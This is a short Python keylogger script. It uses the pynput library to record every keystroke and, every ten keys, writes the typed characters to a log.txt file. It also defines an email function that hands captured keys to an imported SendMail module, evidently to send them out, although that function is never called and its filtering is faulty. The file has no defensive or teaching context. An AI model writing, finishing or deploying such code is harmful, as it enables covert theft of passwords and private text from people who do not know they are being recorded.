import pynput
from pynput.keyboard import Key,Listener
import SendMail

count = 0
keys = []
message = ""

def on_press(key):
    global count,keys
    count += 1
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "w" , encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

def on_release(key):
    if key == Key.esc:
        print("exit")
        return False

def email(keys):
    for key in keys:
        global message
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            message +=k
    
    SendMail.sendEmail(message)


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

